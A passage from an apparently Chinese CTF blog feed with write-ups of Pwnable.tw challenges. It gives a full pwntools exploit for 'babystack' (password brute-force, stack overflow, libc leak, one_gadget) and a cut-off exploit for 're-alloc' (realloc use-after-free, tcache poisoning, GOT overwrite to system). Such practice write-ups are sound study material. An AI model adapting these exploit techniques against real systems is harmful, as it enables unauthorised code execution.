class="line">0x4242c0:0xbb8ad766e692a37f0x3ff3ff28551655b6</span><br></pre></td></tr></table></figure><p>将其作为输入果然返回为1，之后就顺利拿到flag了。🚩</p><p>还有一道go的pwn题还没复现好，之后会单独写一篇，ruan师傅tql✨</p><p>这场比赛打下来收获颇多，但看着大把的安卓逆向实属难受，其实我们堆的pwn和web解出的题目数量和前面的队伍差不多的，主要吃亏在re,crypto和misc，说到底还是自己不够强。keep it up🐱‍👤</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw babystack</title>
      <link href="/2020/10/20/Pwnable_babystack/"/>
      <url>/2020/10/20/Pwnable_babystack/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-babystack"><a href="#Pwnable-tw-babystack" class="headerlink" title="Pwnable.tw babystack"></a>Pwnable.tw babystack</h3><blockquote><p>远程搞我心态🤬，收发改了半天，但漏洞点还是挺细节的。</p></blockquote><span id="more"></span><p>程式一开始先生成长度0x10的随机数并放在rbp-0x20的位置，并在bss上备份。<br>之后是菜单选项：</p><p>1是login要求我们输入password并根据我们输入的password的长度来和栈中相应位置进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall login(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  read_n((unsigned __int8 *)&amp;s, 0x7Fu);</span><br><span class="line">  v1 = strlen(&amp;s);</span><br><span class="line">  if ( strncmp(&amp;s, a1, v1) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  flag = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有2个想法：<br>1.可以通过strncmp依次比较来爆破出password。2.strncmp(&amp;s, a1, v1)，&amp;s是我们的输入，在第一个参数，可通过输入’\x00’直接使其返回为0，login成功。</p><p>login之后我们就可以执行2的copy操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_E76(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char src; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  read_n((unsigned __int8 *)&amp;src, 0x3Fu);</span><br><span class="line">  strcpy(a1, &amp;src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为啥是magic copy?除了strcpy有点可疑，但也没明显的漏洞。</p><p>看了一遍下来除了爆破出password外没啥想法了🤦</p><p>之后一次偶然的尝试在得到password后由于我又多输入’a’*0x50，在copy执行strcpy之后返回主函数发现password被改为’a’了！！！</p><p>仔细调试在汇编里发现问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">login函数的栈帧：</span><br><span class="line"></span><br><span class="line">.text:0000000000000DEF                 push    rbp</span><br><span class="line">.text:0000000000000DF0                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000DF3                 sub     rsp, 90h</span><br><span class="line"></span><br><span class="line">copy函数的栈帧：</span><br><span class="line">.text:0000000000000E76                 push    rbp</span><br><span class="line">.text:0000000000000E77                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000E7A                 sub     rsp, 90h</span><br></pre></td></tr></table></figure><p>主调用函数都是main函数，这意味着login()和copy()函数是公用一个栈的！！！！</p><p>这样就能解释通了，在login()里输入的’a’会残存在栈里，当copy()再次用到这部分栈是，本是想利用read_n((unsigned __int8 *)&amp;src, 0x3Fu);最多输入0x3f那最后一个就是’\x00’来截断，但实际上栈里该处的位置已经被写入了’a’，可导致在strcpy时main函数的栈溢出。</p><p>思路有了，但没地址，肯定有办法泄露的。</p><p>想到password是通过strncmp的比较来获得的，且比较的长度可控，那我们也能用相同的办法泄露出stack里的地址。</p><p>这里我的思路的login时输入’\x00’+’1’*87，这样既能login成功又能改password为’1’*0x10，但为什么是87个呢，一方面是为了strcpy改password，另一个是由于在输入这么多的长度时，main函数stack里的passwoed(被改了的)后面会写入stdvbuf的地址！（至于为什么会写入这个地址，个人想法可能时执行了对输入流初始相关的操作，还有待研究），那这样的话就能通过再次login来leak出Libc地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ rsp  0x7ffd0e102f00 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffd0e102f38 ◂— 0x3161616161616161 (&#x27;aaaaaaa1&#x27;)</span><br><span class="line">08:0040│      0x7ffd0e102f40 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)  //password</span><br><span class="line">... ↓</span><br><span class="line">0a:0050│ rsi  0x7ffd0e102f50 ◂— 0x3131313131310a31 (&#x27;1\n111111&#x27;)</span><br><span class="line">0b:0058│      0x7ffd0e102f58 —▸ 0x7fdc09940fb4 (setvbuf+324) ◂— 0xfc085480b8bd231</span><br><span class="line">0c:0060│ rbp  0x7ffd0e102f60 —▸ 0x5555a2d50060 ◂— 0x41ff894156415741</span><br><span class="line">0d:0068│      0x7ffd0e102f68 —▸ 0x7fdc098f1830 (__libc_start_main+240) ◂</span><br></pre></td></tr></table></figure><p>如果只是改password，而没向下继续覆盖的话是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ rsp  0x7ffc3b4fb510 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffc3b4fb548 ◂— 0x3161616161616161 (&#x27;aaaaaaa1&#x27;)</span><br><span class="line">08:0040│      0x7ffc3b4fb550 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">0a:0050│ rsi  0x7ffc3b4fb560 ◂— 0x7fac80980a31</span><br><span class="line">0b:0058│      0x7ffc3b4fb568 ◂— 0x0</span><br><span class="line">0c:0060│ rbp  0x7ffc3b4fb570 —▸ 0x55c28958a060 ◂— 0x41ff894156415741</span><br></pre></td></tr></table></figure><p>0x7fac80980a31这个地址看着像Libc里的，但实际上他和Libc的偏移是不固定的。</p><p>万事具备了，接下来就是在login时构造好stack，在copy里执行strcpy时将正确的password写入对应位置（退出时会和bss上备份的比较），并改ret_addr为one_gadget🚩</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params"><span class="built_in">len</span>, flag=<span class="literal">False</span></span>):</span><br><span class="line">    secret=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1</span>,<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> j == <span class="number">0x10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Your passowrd :&quot;</span>)</span><br><span class="line">            temp = secret+<span class="built_in">chr</span>(j)+<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            p.sendline(temp)</span><br><span class="line">            recv = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">                secret += <span class="built_in">chr</span>(j)</span><br><span class="line">                log.success(<span class="string">&quot;password: &quot;</span>+secret)</span><br><span class="line">                p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">                p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./babystack&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc_64.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret=get_password(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug(0x000000FA6)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;1&#x27;</span>*(<span class="number">47</span>+<span class="number">32</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">guess=<span class="string">&#x27;1&#x27;</span>*<span class="number">0x11</span>+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1</span>,<span class="number">0x100</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        p.send(guess+<span class="built_in">chr</span>(i)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        recv=p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Success&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            guess+=<span class="built_in">chr</span>(i)</span><br><span class="line">            success(<span class="string">&quot;guess: &quot;</span>+guess)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">libc.address=u64(guess[<span class="number">24</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x06ffb4</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">one_gadget=libc.address+<span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>+secret+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc_64.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw re-alloc</title>
      <link href="/2020/10/19/Pwnable_re-alloc/"/>
      <url>/2020/10/19/Pwnable_re-alloc/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwmable-tw-Re-alloc"><a href="#Pwmable-tw-Re-alloc" class="headerlink" title="Pwmable.tw Re-alloc"></a>Pwmable.tw Re-alloc</h3><blockquote><p>利用思路挺新奇的，学到了学到了🤙</p></blockquote><span id="more"></span><p>典型菜单题，但libc版本为2.29，意味着tecache里面0x8的位置会放入key指向tecache_struct，若要想double free，只能改掉key值。</p><p>add函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  idx = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">1</span> || heap[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    size = read_long();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">realloc</span>(<span class="number">0LL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[idx] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], size));</span><br><span class="line">        *v0 = <span class="number">0</span>;                                <span class="comment">// off_by_one</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>只允许申请两个函数，off_by_one感觉用不了了。</p><p>dele函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">v2 = read_long();</span><br><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v2], <span class="number">0LL</span>);</span><br><span class="line">  v0 = heap;</span><br><span class="line">  heap[v2] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也没有野指针？</p><p>edit函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">v1 = read_long();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = read_long();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">v3 = <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v1], size);</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">heap[v1] = v3;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> read_input(heap[v1], size);</span><br></pre></td></tr></table></figure><p>这一遍看下来发现都是利用realloc函数来完成各种操作，这里对realloc进行一个说明：</p><p>realloc第一个参数为一个指针ptr，第二个参数为size。<br>当ptr&#x3D;NULL时相当于malloc(size)<br>当ptr不为null，且size不为0时，先malloc(size)，再把ptr里的内容拷贝到新内存里（size大于old_size，扩容；size小于old_szie，切割）。<br>当ptr不为null，size&#x3D;0时，相当于free(ptr)。</p><p>因此可以想到edit函数里的realloc函数的size是由我们的输入决定的，如果size为0，则free(ptr)，形成UAF🎈</p><p>但还有一个问题在于没有show函数，而且只有2个能用的堆块是无法实现对stdout的劫持的。。</p><p>这道题提供了一个新的思路：改写atoll_got为printf_plt，构造fmt泄露。</p><p>由于atoll参数为&amp;buf，改为printf的话自然形成fmt，很妙。</p><p>那接下来就是漏洞利用了，先uaf改fd为atoll_got，之后add,这样chunk0&#x3D;chunk1(0x20)，且tecache的0x20上残留了一个atoi_got的地址。然后edit chunk0为较大的size，并dele(0)，同时edit chunk1和chunk0相等的size，同时覆盖key(不然dele(1)时会报错)，之后dele(1),这样一个流程下来就使得即在0x20的tecache bin上留下地址，又清空了两个堆。</p><p>重复上面的流程使得在tecache的多个size链上留下atoll_got，方便后面的利用。</p><p>之后就是修改atoll_got为printf_plt(最好不要用0x20的那个atoll_got)，从而leak。</p><p>leak完后由于atoll被改成了printf，使得我们在add时的输入要有所变化，利用printf的返回值为输出的字符串长度，我们通过add(‘a’+’\0’,’a’*0x10+’\0’)来申请出0x20大小的tecache bin，改atoll_got为system拿到shell🚩</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="comment"># p=process(&quot;./re-alloc&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">p=process([<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so&quot;</span>,<span class="string">&quot;./re-alloc&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;</span>&#125;)</span><br><span class="line">elf=ELF(<span class="string">&quot;./re-alloc&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10106</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,data</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,sz,data</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line"><span class="keyword">if</span> sz!=<span class="number">0</span>:</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span 